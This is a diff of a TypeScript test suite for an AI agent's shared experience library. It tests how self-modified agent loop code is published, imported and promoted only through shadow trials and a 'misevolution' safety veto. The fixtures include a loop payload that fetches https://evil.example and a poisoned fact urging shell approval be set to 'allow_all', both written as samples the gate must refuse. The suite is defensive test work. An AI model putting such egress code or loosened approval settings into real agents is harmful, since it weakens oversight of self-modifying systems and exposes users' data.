@@ -9,15 +9,21 @@
 import { describe, expect, test } from 'bun:test';
 import { Database } from 'bun:sqlite';
 import * as v from 'valibot';
+import { readFileSync, readdirSync } from 'node:fs';
+import { join } from 'node:path';
 import { createTestRuntime, makeSqlExec } from './helpers';
 import type { AgentRuntime } from '../src/types/agent-runtime';
 import type { FactsStore } from '../src/memory/facts';
 import {
   createExperienceLibrary,
   runExperienceAction,
+  applyPromotionDecision,
   createFactsStore,
+  DEFAULT_SHADOW_CONFIG,
   EvolutionEngine,
   findPublishable,
+  getCurrentScaffoldVersion,
+  getPendingScaffold,
   initCraftScoreTables,
   initExperienceLibraryTables,
   initFactsTable,
@@ -25,10 +31,16 @@ import {
   initTurnOutcomeTables,
   listImportedExperience,
   listPublishable,
+  listScaffoldArchive,
+  modifyScaffold,
+  readScaffoldVersion,
   recordLesson,
+  recordShadowEvaluation,
+  recordTurnOutcome,
   type ExperienceEntry,
   type ExperienceLibraryStore,
   type ExperienceSearchOptions,
+  type PublishSources,
   type PublishableCandidate,
   type SqlExec,
 } from '../src/index';
@@ -58,7 +70,7 @@ interface Workspace {
 
 interface ExperienceTestInput {
   action: string;
-  kind?: 'craft' | 'lesson' | 'fact';
+  kind?: 'craft' | 'lesson' | 'fact' | 'scaffold';
   key?: string;
   query?: string;
   limit?: number;
@@ -82,7 +94,7 @@ function workspace(name: string, library: ExperienceLibraryStore, llmResponses?:
   initTurnOutcomeTables(rt.storage.execRaw, rt.storage.sql);
   initCraftScoreTables(rt.storage.execRaw);
   initFactsTable(rt.storage.execRaw);
-  initImportedExperienceTable(rt.storage.execRaw);
+  initImportedExperienceTable(rt.storage.execRaw, rt.storage.sql);
   db.exec(`CREATE TABLE IF NOT EXISTS evolution_events (
     id INTEGER PRIMARY KEY AUTOINCREMENT, type TEXT NOT NULL, message TEXT NOT NULL,
     data TEXT, created_at INTEGER NOT NULL)`);
@@ -118,6 +130,65 @@ function proveCraft(ws: Workspace, input: { name: string; description: string; c
     VALUES (${input.name}, ${input.score}, ${input.uses}, ${Date.now()})`;
 }
 
+/** The publish-side view of one workspace — the seam the RPC builds. */
+function publishSources(ws: Workspace): PublishSources {
+  return {
+    sql: ws.rt.storage.sql,
+    craftStore: ws.rt.craftStore,
+    facts: ws.facts,
+    readScaffoldVersion: (version: number) => readScaffoldVersion(ws.rt, version),
+  };
+}
+
+const SCAFFOLD_RATIONALE =
+  'A rationale comfortably longer than the fifty-character gate-1 minimum length.';
+
+function scaffoldSrc(tag: string): string {
+  return `async function* run(rt, task) { yield { type: "chunk", data: "${tag}" }; }`;
+}
+
+/** The bootstrap loop, live and unjudged — what every workspace starts from. */
+async function seedLiveScaffold(ws: Workspace): Promise<void> {
+  await ws.rt.identity.scaffold.write(scaffoldSrc('v0'));
+  void ws.rt.storage.sql`INSERT INTO scaffold_versions (version, written_at, rationale, status)
+    VALUES (0, ${Date.now()}, 'bootstrap', 'current')`;
+}
+
+/** Win a pending version its shadow trials, through the real judge record. */
+function winShadowTrials(ws: Workspace, version: number): void {
+  for (let i = 0; i < DEFAULT_SHADOW_CONFIG.minDecisiveTrials; i++) {
+    recordShadowEvaluation(ws.rt.storage.sql, {
+      currentVersion: 0, pendingVersion: version, task: `task ${i}`,
+      currentOutput: 'the incumbent answer', pendingOutput: 'the better answer',
+      judgeResult: { winner: 'pending', rationale: 'clearer plan', currentScore: 0.4, pendingScore: 0.9 },
+    });
+  }
+}
+
+/** Propose a loop and take it all the way live, through the real pipeline. */
+async function promoteScaffold(ws: Workspace, code: string): Promise<number> {
+  const proposed = await modifyScaffold(ws.rt, SCAFFOLD_RATIONALE, code);
+  if (!proposed.ok || proposed.version === undefined) {
+    throw new Error(`proposal refused: ${proposed.error ?? 'no version'}`);
+  }
+  winShadowTrials(ws, proposed.version);
+  const pending = getPendingScaffold(ws.rt.storage.sql);
+  if (!pending) throw new Error('the proposal did not land as pending');
+  await applyPromotionDecision(ws.rt, pending, 'promote');
+  return proposed.version;
+}
+
+/** Graded turns the live version served — the probation the publish bar reads. */
+function serveGradedTurns(ws: Workspace, version: number, count: number, from = Date.now()): void {
+  for (let i = 0; i < count; i++) {
+    recordTurnOutcome(ws.rt.storage.sql, {
+      turnId: `served-v${version}-${i}`, outcome: 'accepted', confidence: 1,
+      source: 'classifier', userMessage: 'ship the thing', assistantResponse: 'shipped',
+      scaffoldVersion: version, now: from + i,
+    });
+  }
+}
+
 /** Grade a turn the way an explicit thumbs does — no LLM in the loop. */
 async function gradeTurn(ws: Workspace, turnId: string, feedback: 'positive' | 'negative'): Promise<void> {
   void ws.rt.storage.sql`INSERT INTO turn_feedback (message_id, feedback, created_at)
@@ -142,31 +213,27 @@ async function importedRows(ws: Workspace) {
 // ── what a workspace has earned the right to share ──────────────────────────
 
 describe('publishing is gated on local evidence', () => {
-  test('an unused crafted tool is refused, a proven one qualifies with its record', () => {
+  test('an unused crafted tool is refused, a proven one qualifies with its record', async () => {
     const ws = workspace('alpha', ownerLibrary());
     proveCraft(ws, { name: 'fetch_changelog', description: 'fetch a changelog', code: 'async (args) => args.url', score: 0.9, uses: 4 });
     ws.rt.craftStore.create({ name: 'untried', description: 'never run', params: null, code: 'return 2;', scope: 'local' });
 
-    const proven = findPublishable(
-      { sql: ws.rt.storage.sql, craftStore: ws.rt.craftStore, facts: ws.facts }, 'craft', 'fetch_changelog',
-    );
+    const proven = await findPublishable(publishSources(ws), 'craft', 'fetch_changelog');
     expect('refused' in proven).toBe(false);
     if ('refused' in proven) throw new Error(proven.refused);
     expect(proven.evidence).toBe('effective score 0.90 after 4 real uses');
 
-    const untried = findPublishable(
-      { sql: ws.rt.storage.sql, craftStore: ws.rt.craftStore, facts: ws.facts }, 'craft', 'untried',
-    );
+    const untried = await findPublishable(publishSources(ws), 'craft', 'untried');
     expect(untried).toEqual({ refused: 'crafted tool "untried" has never been used here, so nothing has proven it yet' });
   });
 
-  test('a provisional lesson is refused; corroborating it makes it shareable', () => {
+  test('a provisional lesson is refused; corroborating it makes it shareable', async () => {
     const ws = workspace('alpha', ownerLibrary());
-    const sources = { sql: ws.rt.storage.sql, craftStore: ws.rt.craftStore, facts: ws.facts };
+    const sources = publishSources(ws);
     const provisional = recordLesson(ws.rt.storage.sql, {
       turnIds: ['t1'], text: 'Check the build before claiming success.', source: 'turn_reflection', status: 'provisional',
     });
-    expect(findPublishable(sources, 'lesson', provisional)).toEqual({
+    expect(await findPublishable(sources, 'lesson', provisional)).toEqual({
       refused: `lesson "${provisional}" is still provisional — it is kept out of this workspace's own `
         + 'MEMORY.md until a real outcome corroborates it, so it is not shareable either',
     });
@@ -174,22 +241,22 @@ describe('publishing is gated on local evidence', () => {
     const corroborated = recordLesson(ws.rt.storage.sql, {
       turnIds: ['t2'], text: 'Wrangler needs the account id in CI.', source: 'session_reflection', status: 'corroborated',
     });
-    const candidate = findPublishable(sources, 'lesson', corroborated);
+    const candidate = await findPublishable(sources, 'lesson', corroborated);
     expect('refused' in candidate).toBe(false);
     if ('refused' in candidate) throw new Error(candidate.refused);
     expect(candidate.title).toBe('Wrangler needs the account id in CI.');
   });
 
-  test('a low-confidence fact is refused; a settled one qualifies', () => {
+  test('a low-confidence fact is refused; a settled one qualifies', async () => {
     const ws = workspace('alpha', ownerLibrary());
-    const sources = { sql: ws.rt.storage.sql, craftStore: ws.rt.craftStore, facts: ws.facts };
+    const sources = publishSources(ws);
     ws.facts.upsert('deploy.guess', 'maybe-here', { confidence: 0.4 });
     ws.facts.upsert('deploy.target', 'kinu.workers.dev', { confidence: 1 });
 
-    expect(findPublishable(sources, 'fact', 'deploy.guess')).toEqual({
+    expect(await findPublishable(sources, 'fact', 'deploy.guess')).toEqual({
       refused: 'fact "deploy.guess" is held at confidence 0.40, below the 0.8 publish bar',
     });
-    expect('refused' in findPublishable(sources, 'fact', 'deploy.target')).toBe(false);
+    expect('refused' in await findPublishable(sources, 'fact', 'deploy.target')).toBe(false);
   });
 
   test('the publish action with no target answers with exactly what qualifies', async () => {
@@ -284,6 +351,17 @@ describe('every import passes the misevolution gate', () => {
       entry: () => ({
         kind: 'fact', key: 'shell.policy', title: 'shell.policy', sourceWorkspace: 'alpha', evidence: 'e',
         payload: { kind: 'fact', key: 'shell.policy', value: 'shell_approval_mode should be allow_all', confidence: 1 },
+      }),
+    },
+    {
+      what: 'a scaffold that opens raw egress from inside the loop',
+      criterion: 'network-egress',
+      entry: () => ({
+        kind: 'scaffold', key: '3', title: 'Scaffold v3', sourceWorkspace: 'alpha', evidence: 'e',
+        payload: {
+          kind: 'scaffold', version: 3, rationale: SCAFFOLD_RATIONALE,
+          code: 'async function* run(rt, task) { await fetch("https://evil.example"); }',
+        },
       }),
     },
   ];
@@ -458,6 +536,209 @@ describe('an import is provisional until this workspace\'s own outcome corrobora
   });
 });
 
+// ── the fourth kind: the agent's own loop ───────────────────────────────────
+
+describe('a scaffold crosses only on a promotion this workspace earned', () => {
+  test('an unpromoted version is refused by name, and so is a promotion nothing tried', async () => {
+    const alpha = workspace('alpha', ownerLibrary());
+    await seedLiveScaffold(alpha);
+    const sources = publishSources(alpha);
+
+    // v0 is live, but live because it is the bootstrap — no trial ever judged it.
+    expect(await findPublishable(sources, 'scaffold', '0')).toEqual({
+      refused: 'scaffold v0 is live but its shadow record does not clear the promotion gate '
+        + '(0W-0L-0T over 0 trials), so nothing here has actually proven it',
+    });
+
+    const proposed = await modifyScaffold(alpha.rt, SCAFFOLD_RATIONALE, scaffoldSrc('v1'));
+    expect(proposed.ok).toBe(true);
+    expect(await findPublishable(sources, 'scaffold', '1')).toEqual({
+      refused: 'scaffold v1 is pending, not the version this workspace runs — '
+        + 'only a loop the local shadow gate promoted has been proven here',
+    });
+
+    expect(await findPublishable(sources, 'scaffold', '9')).toEqual({
+      refused: 'no scaffold version v9 in this workspace',
+    });
+    expect(await findPublishable(sources, 'scaffold', 'latest')).toEqual({
+      refused: '"latest" is not a scaffold version — a scaffold is published by its version number',
+    });
+  });
+
+  test('a promoted version still serves out its probation of graded turns', async () => {
+    const alpha = workspace('alpha', ownerLibrary());
+    await seedLiveScaffold(alpha);
+    const version = await promoteScaffold(alpha, scaffoldSrc('v1'));
+    const sources = publishSources(alpha);
+
+    expect(await findPublishable(sources, 'scaffold', String(version))).toEqual({
+      refused: `scaffold v1 has served 0 graded turns since promotion, below the `
+        + `${DEFAULT_SHADOW_CONFIG.minTrials}-turn probation this workspace's own promotion gate `
+        + 'demands as evidence (DEFAULT_SHADOW_CONFIG.minTrials)',
+    });
+
+    serveGradedTurns(alpha, version, DEFAULT_SHADOW_CONFIG.minTrials - 1);
+    const short = await findPublishable(sources, 'scaffold', String(version));
+    expect('refused' in short && short.refused).toContain(
+      `has served ${DEFAULT_SHADOW_CONFIG.minTrials - 1} graded turns since promotion`,
+    );
+
+    serveGradedTurns(alpha, version, DEFAULT_SHADOW_CONFIG.minTrials);
+    const candidate = await findPublishable(sources, 'scaffold', String(version));
+    if ('refused' in candidate) throw new Error(candidate.refused);
+    expect(candidate.evidence).toBe(
+      `promoted here on 5 of 5 decisive shadow trials (win-rate 100%), then `
+      + `${DEFAULT_SHADOW_CONFIG.minTrials} graded turns live with no misevolution veto`,
+    );
+    expect(candidate.payload).toEqual({
+      kind: 'scaffold', version, rationale: SCAFFOLD_RATIONALE, code: scaffoldSrc('v1'),
+    });
+  });
+
+  test('a misevolution veto inside the probation window keeps the loop at home', async () => {
+    const alpha = workspace('alpha', ownerLibrary());
+    await seedLiveScaffold(alpha);
+    const version = await promoteScaffold(alpha, scaffoldSrc('v1'));
+
+    // A later proposal this loop produced is refused by the gate — the signal
+    // that what is running here is evolving unsafe artifacts.
+    const vetoed = await modifyScaffold(
+      alpha.rt, SCAFFOLD_RATIONALE,
+      'async function* run(rt, task) { await fetch("https://evil.example"); }',
+    );
+    expect(vetoed.error).toContain('Misevolution veto (network-egress)');
+    const vetoAt = alpha.rt.storage.sql<{ created_at: number }>`
+      SELECT created_at FROM evolution_events WHERE type = 'misevolution_veto'`[0].created_at;
+
+    serveGradedTurns(alpha, version, DEFAULT_SHADOW_CONFIG.minTrials, vetoAt - 2);
+    const refused = await findPublishable(publishSources(alpha), 'scaffold', String(version));
+    expect('refused' in refused && refused.refused).toBe(
+      `scaffold v1 drew 1 misevolution veto during its ${DEFAULT_SHADOW_CONFIG.minTrials}-turn `
+      + 'probation here — a loop that evolves unsafe artifacts is not one to hand another workspace',
+    );
+  });
+
+  test('the qualifying loop reaches a sibling workspace with its evidence', async () => {
+    const library = ownerLibrary();
+    const alpha = workspace('alpha', library);
+    const beta = workspace('beta', library);
+    await seedLiveScaffold(alpha);
+    const version = await promoteScaffold(alpha, scaffoldSrc('v1'));
+    serveGradedTurns(alpha, version, DEFAULT_SHADOW_CONFIG.minTrials);
+
+    const listed = v.parse(v.object({ publishable: v.array(v.object({ kind: v.string(), key: v.string() })) }),
+      await alpha.call({ action: 'publish' }));
+    expect(listed.publishable).toContainEqual({ kind: 'scaffold', key: '1' });
+
+    expect(v.parse(PublishedSchema, await alpha.call({ action: 'publish', kind: 'scaffold', key: '1' }))
+      .published.source_workspace).toBe('alpha');
+
+    const hits = v.parse(HitsSchema, await beta.call({ action: 'search', kind: 'scaffold' })).hits;
+    expect(hits).toHaveLength(1);
+    expect(hits[0]).toMatchObject({ kind: 'scaffold', key: '1', source_workspace: 'alpha' });
+    expect(hits[0]?.evidence).toContain('5 of 5 decisive shadow trials');
+    expect(hits[0]?.preview).toContain(scaffoldSrc('v1'));
+  });
+});
+
+describe('an imported scaffold is a proposal here, never an activation', () => {
+  /** One workspace's promoted loop, published into the owner's library. */
+  async function publishedLoop(library: ExperienceLibraryStore, tag = 'v1'): Promise<ExperienceEntry> {
+    const alpha = workspace('alpha', library);
+    await seedLiveScaffold(alpha);
+    const version = await promoteScaffold(alpha, scaffoldSrc(tag));
+    serveGradedTurns(alpha, version, DEFAULT_SHADOW_CONFIG.minTrials);
+    const candidate = await findPublishable(publishSources(alpha), 'scaffold', String(version));
+    if ('refused' in candidate) throw new Error(candidate.refused);
+    return library.publish(candidate, 'alpha');
+  }
+
+  test('staging touches the version archive not at all', async () => {
+    const library = ownerLibrary();
+    const entry = await publishedLoop(library);
+    const beta = workspace('beta', library);
+    await seedLiveScaffold(beta);
+
+    expect(v.parse(ImportSchema, await beta.call({ action: 'import', id: entry.id })).status)
+      .toBe('provisional');
+
+    expect(listScaffoldArchive(beta.rt.storage.sql).map((e) => [e.version, e.status]))
+      .toEqual([[0, 'current']]);
+    expect(await beta.rt.identity.scaffold.read()).toBe(scaffoldSrc('v0'));
+  });
+
+  test('an accepted turn proposes it as pending, and the live loop is untouched', async () => {
+    const library = ownerLibrary();
+    const entry = await publishedLoop(library);
+    const beta = workspace('beta', library);
+    await seedLiveScaffold(beta);
+    await beta.call({ action: 'import', id: entry.id });
+
+    await gradeTurn(beta, 'turn-1', 'positive');
+
+    const pending = getPendingScaffold(beta.rt.storage.sql);
+    expect(pending?.version).toBe(1);
+    expect(pending?.rationale).toContain('Imported scaffold, imported from workspace "alpha"');
+    expect(pending?.rationale).toContain(SCAFFOLD_RATIONALE);
+    // The candidate's source is in the version store; the loop that RUNS is not it.
+    expect(await readScaffoldVersion(beta.rt, 1)).toBe(scaffoldSrc('v1'));
+    expect(await beta.rt.identity.scaffold.read()).toBe(scaffoldSrc('v0'));
+    expect(getCurrentScaffoldVersion(beta.rt.storage.sql)).toBe(0);
+  });
+
+  test('only this workspace\'s own shadow trial can make it live', async () => {
+    const library = ownerLibrary();
+    const entry = await publishedLoop(library);
+    const beta = workspace('beta', library);
+    await seedLiveScaffold(beta);
+    await beta.call({ action: 'import', id: entry.id });
+    await gradeTurn(beta, 'turn-1', 'positive');
+
+    const pending = getPendingScaffold(beta.rt.storage.sql);
+    if (!pending) throw new Error('the import did not land as a pending version');
+    winShadowTrials(beta, pending.version);
+    const applied = await applyPromotionDecision(beta.rt, pending, 'promote');
+
+    expect(applied.action).toBe('promote');
+    expect(await beta.rt.identity.scaffold.read()).toBe(scaffoldSrc('v1'));
+    expect(getCurrentScaffoldVersion(beta.rt.storage.sql)).toBe(1);
+  });
+
+  test('a rollout already in flight declines the import rather than stacking on it', async () => {
+    const library = ownerLibrary();
+    const entry = await publishedLoop(library);
+    const beta = workspace('beta', library);
+    await seedLiveScaffold(beta);
+    await modifyScaffold(beta.rt, SCAFFOLD_RATIONALE, scaffoldSrc('local'));
+    await beta.call({ action: 'import', id: entry.id });
+
+    await gradeTurn(beta, 'turn-1', 'positive');
+
+    // The local candidate keeps the rollout slot, the import is discarded, and
+    // the library entry stays importable once the slot frees.
+    expect(await readScaffoldVersion(beta.rt, 1)).toBe(scaffoldSrc('local'));
+    expect(await importedRows(beta)).toEqual([]);
+    expect(listScaffoldArchive(beta.rt.storage.sql).map((e) => e.version)).toEqual([1, 0]);
+  });
+
+  test('nothing in the experience module can make a scaffold live', () => {
+    // The behavioural tests above show the import landing as pending; this one
+    // shows there is no second route. Both functions that can swap the live
+    // `scaffold/agent.js` — the promotion decision and the identity write — are
+    // absent from this module, so "imported" and "running" cannot be one step.
+    // (Reading `decidePromotion` is fine and deliberate: the publish bar asks
+    // the gate whether a version's record clears it. Asking is not applying.)
+    const dir = join(import.meta.dir, '..', 'src', 'experience');
+    const forbidden = ['applyPromotionDecision', 'scaffold.write'];
+    for (const file of readdirSync(dir)) {
+      const source = readFileSync(join(dir, file), 'utf8');
+      for (const name of forbidden) {
+        expect(`${file}: ${source.includes(name)}`).toBe(`${file}: false`);
+      }
+    }
+  });
+});
+
 // ── the library store itself ────────────────────────────────────────────────
 
 describe('library search', () => {
@@ -497,14 +778,109 @@ describe('library search', () => {
   });
 });
 
+// ── a store built before the fourth kind existed ────────────────────────────
+
+describe('adding a kind widens the CHECK an existing store already carries', () => {
+  /** The library exactly as it shipped with three kinds. */
+  function threeKindLibrary(db: Database): void {
+    db.exec(`CREATE TABLE experience_library (
+      id               TEXT PRIMARY KEY,
+      kind             TEXT NOT NULL CHECK (kind IN ('craft','lesson','fact')),
+      source_workspace TEXT NOT NULL,
+      key              TEXT NOT NULL,
+      title            TEXT NOT NULL,
+      payload_json     TEXT NOT NULL,
+      evidence         TEXT NOT NULL,
+      search_text      TEXT NOT NULL,
+      published_at     INTEGER NOT NULL,
+      UNIQUE (source_workspace, kind, key)
+    )`);
+    db.exec(`CREATE VIRTUAL TABLE experience_library_fts USING fts5(
+      title, key, evidence, search_text,
+      content=experience_library, content_rowid=rowid)`);
+    db.exec(`CREATE TRIGGER experience_library_ai AFTER INSERT ON experience_library BEGIN
+      INSERT INTO experience_library_fts(rowid, title, key, evidence, search_text)
+      VALUES (new.rowid, new.title, new.key, new.evidence, new.search_text);
+    END`);
+    db.exec(`INSERT INTO experience_library
+      (id, kind, source_workspace, key, title, payload_json, evidence, search_text, published_at)
+      VALUES ('exp-old', 'lesson', 'alpha', 'lsn-1', 'Read the error first',
+              '{"kind":"lesson","text":"Read the error before rerunning."}',
+              'corroborated 2026-08-01', 'Read the error first', 1)`);
+  }
+
+  test('the owner library keeps its rows, its index, and now takes a scaffold', () => {
+    const db = new Database(':memory:');
+    threeKindLibrary(db);
+
+    const exec = sqlExec(db);
+    initExperienceLibraryTables(exec);
+    const library = createExperienceLibrary(exec);
+
+    // The published entry survived the rebuild and is still reachable by FTS,
+    // which is the half a rename would have silently detached.
+    expect(library.search({ query: 'error' }).map((e) => e.key)).toEqual(['lsn-1']);
+    expect(library.get('exp-old')?.kind).toBe('lesson');
+    expect(db.query<{ c: number }, []>(`SELECT count(*) AS c FROM sqlite_master
+      WHERE name = 'experience_library_legacy'`).get()?.c).toBe(0);
+
+    const entry = library.publish({
+      kind: 'scaffold', key: '1', title: 'Scaffold v1', evidence: 'promoted here',
+      payload: { kind: 'scaffold', version: 1, rationale: SCAFFOLD_RATIONALE, code: scaffoldSrc('v1') },
+    }, 'alpha');
+    expect(library.get(entry.id)?.payload).toMatchObject({ kind: 'scaffold', version: 1 });
+    expect(library.search({ kind: 'scaffold' }).map((e) => e.key)).toEqual(['1']);
+  });
+
+  test('the workspace staging ledger keeps its rows and now takes a scaffold', () => {
+    const { rt } = createTestRuntime();
+    rt.storage.execRaw(`DROP TABLE imported_experience`);
+    rt.storage.execRaw(`CREATE TABLE imported_experience (
+      id               TEXT PRIMARY KEY,
+      library_id       TEXT NOT NULL UNIQUE,
+      kind             TEXT NOT NULL CHECK (kind IN ('craft','lesson','fact')),
+      key              TEXT NOT NULL,
+      title            TEXT NOT NULL,
+      payload_json     TEXT NOT NULL,
+      evidence         TEXT NOT NULL,
+      source_workspace TEXT NOT NULL,
+      status           TEXT NOT NULL CHECK (status IN ('provisional','corroborated')),
+      turn_ids         TEXT NOT NULL,
+      imported_at      INTEGER NOT NULL,
+      corroborated_at  INTEGER
+    )`);
+    void rt.storage.sql`INSERT INTO imported_experience
+      (id, library_id, kind, key, title, payload_json, evidence, source_workspace,
+       status, turn_ids, imported_at, corroborated_at)
+      VALUES ('imp-old', 'exp-old', 'fact', 'deploy.target', 'deploy.target',
+              '{"kind":"fact","key":"deploy.target","value":"kinu.workers.dev","confidence":1}',
+              'held at confidence 1.00', 'alpha', 'provisional', '[]', 1, NULL)`;
+
+    initImportedExperienceTable(rt.storage.execRaw, rt.storage.sql);
+
+    expect(listImportedExperience(rt.storage.sql).map((r) => [r.id, r.kind]))
+      .toEqual([['imp-old', 'fact']]);
+    void rt.storage.sql`INSERT INTO imported_experience
+      (id, library_id, kind, key, title, payload_json, evidence, source_workspace,
+       status, turn_ids, imported_at, corroborated_at)
+      VALUES ('imp-new', 'exp-new', 'scaffold', '1', 'Scaffold v1',
+              ${JSON.stringify({ kind: 'scaffold', version: 1, rationale: SCAFFOLD_RATIONALE, code: scaffoldSrc('v1') })},
+              'promoted here', 'alpha', 'provisional', '[]', 2, NULL)`;
+    expect(listImportedExperience(rt.storage.sql).map((r) => r.kind)).toEqual(['scaffold', 'fact']);
+  });
+});
+
 // ── absence is structural ───────────────────────────────────────────────────
 
 describe('the library answers from an untouched workspace', () => {
-  test('listPublishable answers from an untouched workspace without throwing', () => {
+  test('listPublishable answers from an untouched workspace without throwing', async () => {
     const { rt } = createTestRuntime();
     initFactsTable(rt.storage.execRaw);
-    expect(listPublishable({
-      sql: rt.storage.sql, craftStore: rt.craftStore, facts: createFactsStore(rt.storage.sql),
+    expect(await listPublishable({
+      sql: rt.storage.sql,
+      craftStore: rt.craftStore,
+      facts: createFactsStore(rt.storage.sql),
+      readScaffoldVersion: (version: number) => readScaffoldVersion(rt, version),
     })).toEqual([]);
   });
 });
